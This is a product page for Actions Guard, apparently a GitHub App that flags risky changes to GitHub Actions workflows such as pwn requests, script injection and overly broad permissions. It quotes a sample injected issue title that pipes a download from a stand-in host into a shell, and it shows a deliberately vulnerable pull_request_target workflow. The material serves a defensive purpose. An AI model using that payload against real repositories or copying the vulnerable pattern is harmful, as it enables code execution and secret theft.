Actions Guard

Reviews pull requests that change GitHub Actions workflows and flags the security risks they add – before they reach your default branch. It only reports what a pull request adds, so it's quiet on day one and loud when it matters.

Install on GitHub Source code Self-host

How it works

When a pull request touches .github/workflows/, Actions Guard reads each changed workflow at the base and at the head commit, runs the rules below on both, and compares them. Whatever is new is reported as a check run – with an annotation on the line – and in one comment it keeps up to date. The check fails at high by default, so branch protection can require it.

Rules

Based on GitHub's own security hardening guide for Actions.

untrusted-checkout

critical

pull_request_target and workflow_run run with a write token and the repository's secrets, even for pull requests from forks. Checking out the pull request's code there and running anything from it – a build, tests, an install script – hands both to whoever opened the pull request. This is known as a "pwn request".

Risky 
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm install
Instead 
on: pull_request   # no secrets for forks
steps:
  - uses: actions/checkout@v4
  - run: npm install

script-injection

high

Expressions like ${{ github.event.issue.title }} are pasted into the script before the shell sees it. A title such as "; curl evil.sh | sh # becomes code. Covered: titles and bodies of issues, pull requests, discussions, comments and reviews; commit messages and authors; branch names (github.head_ref, pull_request.head.ref, …); wiki page names.

Risky 
- run: echo "${{ github.event.issue.title }}"
Instead 
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"

self-hosted-runner

high

In a public repository anyone can open a pull request. A job on pull_request that runs on a self-hosted runner executes their code on your machine – which usually keeps state between jobs and can reach your network. Use GitHub-hosted runners for pull requests.

excessive-permissions

highmediumlow

write-all is high. Write access to contents, actions, packages or deployments is medium – it reaches code, workflows and releases. Narrower write scopes, like pull-requests or id-token for trusted publishing, are low: often right, worth a look when a pull request adds them. Give each job only what it needs.

unpinned-action

medium

A tag like @v2 can be moved by the action's owner – or by whoever takes over their account – and the new code runs with your token and secrets. Pin third-party actions, reusable workflows and docker:// images to a full commit SHA or digest. actions/* and github/* are allowed by default (see allow_unpinned). 

- uses: some-org/deploy-action@8f4b7f84bd9e2f5d0a1c9b3e6d7a8c9b0e1f2a3b # v2.1.0

secrets-inherit

medium

secrets: inherit passes every secret of the repository to the called workflow. Pass only the ones it uses: secrets: { token: ${{ secrets.DEPLOY_TOKEN }} }.

missing-permissions

low

Without a permissions: block the token gets the repository's default, which can be write access to everything. Add permissions: contents: read (or {}) at the top of the workflow and widen it per job.

curl-pipe-shell

low

curl … | bash runs whatever the server sends today. Download a pinned version, check its checksum, then run it.

Settings

Optional, in .github/actions-guard.yml on the default branch. It's read from the base of each pull request, so a pull request can't relax its own review. 

fail_on: high            # critical, high, medium, low or never
ignore: [curl-pipe-shell]
allow_unpinned: [actions/*, github/*, my-org/*]

Permissions

Permission Access Used for
Contents read the workflow files at the base and head commits
Pull requests write the list of changed files, and the review comment
Checks write the check run with its annotations
Metadata read required by GitHub for every app

Events: pull_request only.

Privacy

Actions Guard processes the list of changed files and the workflow files of pull requests in repositories where it is installed. Each webhook is handled in memory and discarded; no code, file contents or personal data are stored, logged or shared. Logs hold only the delivery ID, the repository and pull request number, and the outcome. There are no analytics or cookies. Uninstalling the app ends all access.
